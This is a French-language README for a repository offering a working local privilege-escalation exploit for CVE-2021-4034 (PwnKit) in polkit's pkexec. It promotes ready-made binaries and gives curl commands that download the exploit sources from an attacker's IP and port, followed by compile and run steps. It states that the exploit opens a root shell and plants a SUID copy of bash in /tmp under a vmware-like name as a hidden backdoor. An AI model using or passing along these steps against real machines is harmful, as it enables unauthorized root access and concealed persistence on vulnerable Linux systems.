SALUT A TOUS !


 * Ce Repos Contient un de mes premiers projets de maldev
 * Il s'agit d'un exploit opérationnel pour la vulnérabilité CVE-2021-4034 alias Pwnkit
 * Toutes les versions de polkit (et plus précisément de son utilitaire pkexec) sorties entre mai 2009 et janvier 2022 sont affectées par cette vulnérabilité.
 + ELLE VOUS PERMET DE PASSER D'UN UTILISATEUR NON PRIVILEGIE A ROOT !!
 + PUISSANT RAPIDE ET EFFICACE !
 
 
 ---Bon pour l'exploit  vous aurez à compiler le code source en fonction de la version de votre cible pour une meilleure efficacité
 ---Sinon j'ai joint deux binaires tout prêts pour des versions plus anciennes et plus modernes de votre cible linux 
 ---Vous n'avez qu'à les télécharger (1 fichier binaire et un fichier .so) dans le même répertoire et puis lancer le binaire
 + en plus de vous ouvrir un shell root il va créer une copie de bash dont le bit suid est activé à /tmp/vmware-000000004G4nTP4TH0G3N3 ou quelque chose comme ça
 
 
 --------AU---CAS----OU---VOUS----DEVEZ------COMPILER-----------VOUS-------MEME------
 
 1_TELECHARGER LES FICHIERS: (remplacez ip:port par les vôtres lol)
  curl http://10.10.15.106:8080/ascii.c -o ascii.c
  curl http://10.10.15.106:8080/main.c -o main.c
  
 2_COMPILEZ (ignorez les warnings, ils sont dus à ma bannière pas très sobre)
 gcc main.c -o main
 gcc -shared -fPIC ascii.c -o ascii.so
 
 et GO ./main (n'oubliez pas le chmod +x ;)
